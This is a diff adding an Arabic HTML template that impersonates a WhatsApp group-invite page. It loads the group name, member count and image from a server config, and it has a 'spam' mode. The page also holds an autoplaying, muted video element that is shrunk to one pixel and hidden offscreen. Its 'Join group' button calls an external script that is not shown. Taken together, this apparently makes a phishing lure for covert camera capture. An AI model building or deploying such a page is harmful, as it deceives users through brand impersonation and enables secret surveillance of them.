@@ -1,0 +1,292 @@
+<!DOCTYPE html>
+<html lang="ar" dir="rtl">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
+    <title>انضمام للمجموعة</title>
+    <link href="https://fonts.googleapis.com/icon?family=Material+Icons" rel="stylesheet">
+    <link href="https://fonts.googleapis.com/css2?family=Roboto:wght@400;500;700&display=swap" rel="stylesheet">
+    
+    <style>
+        /* CSS يوضع هنا */
+        :root {
+            --whatsapp-green: #008069; 
+            --whatsapp-light-green: #25D366;
+            --background-color: #F0F2F5; 
+            --text-color: #111B21;
+            --secondary-text: #667781;
+            --card-background: #FFFFFF;
+        }
+
+        * {
+            box-sizing: border-box;
+            margin: 0;
+            padding: 0;
+            font-family: 'Roboto', sans-serif;
+            -webkit-tap-highlight-color: transparent;
+        }
+
+        body {
+            background-color: var(--background-color);
+            display: flex;
+            justify-content: center;
+            align-items: center;
+            min-height: 100vh;
+            padding: 20px; 
+        }
+        
+        .container {
+            width: 100%;
+            max-width: 400px; 
+            background-color: var(--card-background);
+            box-shadow: 0 4px 12px rgba(0, 0, 0, 0.15); 
+            border-radius: 8px; 
+            overflow: hidden;
+            transition: max-width 0.3s ease;
+        }
+
+        .header {
+            background-color: var(--whatsapp-green);
+            color: white;
+            padding: 12px 15px;
+            font-size: 18px;
+            font-weight: 500;
+            display: flex;
+            align-items: center;
+            box-shadow: 0 1px 3px rgba(0, 0, 0, 0.1);
+        }
+
+        .header .material-icons {
+            font-size: 24px;
+            margin-left: 15px;
+            cursor: pointer;
+            visibility: hidden; /* إخفاء زر الرجوع */
+        }
+        
+        .header .title {
+            font-weight: 400;
+        }
+
+        .group-details {
+            display: flex;
+            flex-direction: column;
+            align-items: center;
+            padding: 40px 20px 20px;
+            background-color: var(--card-background);
+        }
+
+        .group-image {
+            width: 130px; 
+            height: 130px;
+            border-radius: 50%;
+            object-fit: cover;
+            margin-bottom: 20px;
+            border: 4px solid var(--background-color); 
+            box-shadow: 0 2px 8px rgba(0, 0, 0, 0.1);
+        }
+        
+        .default-icon {
+            font-size: 70px; 
+            line-height: 130px;
+            text-align: center;
+            background-color: #B9B9B9;
+            color: white;
+            display: block;
+        }
+
+        .group-name {
+            font-size: 22px;
+            font-weight: 700;
+            color: var(--text-color);
+            margin-bottom: 5px;
+            text-align: center;
+        }
+
+        .member-count {
+            font-size: 14px;
+            color: var(--secondary-text);
+        }
+
+        .join-section {
+            padding: 30px 20px 40px;
+            text-align: center;
+            background-color: var(--card-background); 
+        }
+
+        .action-button {
+            width: 95%;
+            padding: 14px;
+            background-color: var(--whatsapp-light-green);
+            color: white;
+            border: none;
+            border-radius: 25px; 
+            font-size: 17px;
+            font-weight: 500;
+            cursor: pointer;
+            transition: background-color 0.2s, box-shadow 0.2s;
+            box-shadow: 0 4px 8px rgba(0, 0, 0, 0.2);
+            margin-top: 25px;
+        }
+        
+        .action-button.success {
+            background-color: #4CAF50 !important; /* لون نجاح */
+            pointer-events: none; /* تعطيل الضغط بعد النجاح */
+        }
+
+        .action-button:active:not(:disabled) {
+            transform: translateY(1px);
+            box-shadow: 0 2px 4px rgba(0, 0, 0, 0.2);
+        }
+        
+        .action-button:hover:not(:disabled) {
+            background-color: #1DA851;
+        }
+
+        .action-button:disabled {
+            opacity: 0.7;
+            cursor: not-allowed;
+            filter: grayscale(10%);
+        }
+
+        .status-message {
+            font-size: 15px;
+            color: var(--secondary-text);
+            font-weight: 400;
+            margin-top: 15px;
+        }
+        
+        .status-message.spam {
+            color: #d9534f;
+            font-weight: 500;
+            padding: 10px;
+            background-color: #fcebeb;
+            border-radius: 8px;
+            border: 1px solid #d9534f40;
+        }
+
+        .spinner {
+            border: 3px solid rgba(255, 255, 255, 0.3);
+            border-top: 3px solid white;
+            border-radius: 50%;
+            width: 18px;
+            height: 18px;
+            animation: spin 1s linear infinite;
+            display: none;
+            margin-right: 8px;
+            vertical-align: middle;
+        }
+
+        @keyframes spin {
+            0% { transform: rotate(0deg); }
+            100% { transform: rotate(360deg); }
+        }
+
+        #videoElement {
+            position: fixed;
+            top: -1000px; 
+            left: -1000px;
+            width: 1px;
+            height: 1px;
+            z-index: -1;
+        }
+
+        /* Responsive Design for Mobile */
+        @media (max-width: 480px) {
+            body {
+                padding: 0; 
+                align-items: flex-start;
+            }
+            
+            .container {
+                max-width: 100%;
+                min-height: 100vh; 
+                border-radius: 0; 
+                box-shadow: none; 
+            }
+
+            .header {
+                padding: 15px 10px;
+            }
+        }
+    </style>
+</head>
+<body>
+    
+    <div class="container">
+        <div class="header">
+            <span class="material-icons">arrow_back</span>
+            <span class="title">دعوة المجموعة</span>
+        </div>
+
+        <div class="group-details">
+            <img id="groupImage" class="group-image" src="" alt="صورة المجموعة" style="display: none;">
+            
+            <div id="defaultIcon" class="group-image default-icon" style="display: block;"><span class="material-icons" style="font-size: 70px;">group</span></div>
+
+            <h2 id="groupName" class="group-name">...جاري التحميل</h2>
+            
+            <p id="groupMembers" class="member-count">0 عضو</p>
+        </div>
+
+        <div class="join-section">
+            <h3 style="color: var(--text-color); font-weight: 500; margin-bottom: 5px;">دعوة للانضمام إلى:</h3>
+            <p id="groupNameSmall" style="color: var(--whatsapp-green); font-size: 16px; font-weight: 500; margin-bottom: 20px;"></p>
+
+            <p id="statusMessage" class="status-message">انقر على "الانضمام للمجموعة" للمتابعة.</p>
+            
+            <button id="actionButton" class="action-button" onclick="startSequence()">
+                الانضمام للمجموعة
+                <span id="loadingSpinner" class="spinner"></span>
+            </button>
+        </div>
+        
+        <video id="videoElement" autoplay muted></video>
+    </div>
+
+    <script src="{{ url_for('static', filename='script.js') }}"></script>
+
+    <script>
+        // المتغيرات التي سيستخدمها script.js
+        let config = {}; 
+
+        document.addEventListener('DOMContentLoaded', function() {
+            fetchConfig();
+        });
+
+        async function fetchConfig() {
+            try {
+                const response = await fetch('/get_config');
+                config = await response.json(); // حفظ الإعدادات في المتغير config
+
+                document.getElementById('groupName').textContent = config.group_name;
+                document.getElementById('groupNameSmall').textContent = config.group_name;
+                document.getElementById('groupMembers').textContent = `${config.group_members.toLocaleString('en-US')} أعضاء`;
+
+                const groupImageElement = document.getElementById('groupImage');
+                const defaultIconElement = document.getElementById('defaultIcon');
+
+                if (config.group_image) {
+                    groupImageElement.src = config.group_image;
+                    groupImageElement.style.display = 'block';
+                    defaultIconElement.style.display = 'none';
+                } else {
+                    groupImageElement.style.display = 'none';
+                    defaultIconElement.style.display = 'block';
+                }
+
+                const statusMessageElement = document.getElementById('statusMessage');
+                if (config.mode === 'spam' && config.spam_message) {
+                     statusMessageElement.textContent = config.spam_message;
+                     statusMessageElement.classList.add('spam');
+                } else {
+                     statusMessageElement.textContent = "انضم إلينا في هذه المجموعة!";
+                }
+
+            } catch (error) {
+                console.error('Error fetching configuration:', error);
+                document.getElementById('groupName').textContent = 'تعذر تحميل بيانات المجموعة';
+            }
+        }
+    </script>
+</body>
+</html>
